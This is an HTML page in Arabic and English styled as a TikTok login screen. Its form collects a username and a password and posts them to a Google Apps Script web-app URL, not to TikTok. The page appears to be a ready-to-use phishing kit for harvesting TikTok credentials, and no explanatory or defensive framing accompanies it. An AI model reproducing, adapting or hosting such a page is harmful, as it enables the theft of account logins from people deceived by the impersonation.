<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل دخول TikTok</title>
  <style>
    body {
      background-color: #000;
      color: white;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #111;
      padding: 2rem;
      border-radius: 12px;
      width: 320px;
      box-shadow: 0 0 15px #ff0050;
    }

    .login-box h2 {
      text-align: center;
      color: #ff0050;
      margin-bottom: 1.5rem;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 6px;
      outline: none;
    }

    button {
      background-color: #ff0050;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
    }

    button:hover {
      background-color: #e60045;
    }
  </style>
</head>
<body>

  <form class="login-box" method="POST" action="https://script.google.com/macros/s/AKfycbzcoa2RER7_GmiQM5gWYsjjI2RKKfhwFcca3k5yL2kidpWfaLt3SO1t59kBD1JNPnFHVw/exec">
    <h2>TikTok Login</h2>
    <input type="text" name="username" placeholder="اسم المستخدم" required>
    <input type="password" name="password" placeholder="كلمة المرور" required>
    <button type="submit">تسجيل الدخول</button>
  </form>

</body>
</html>
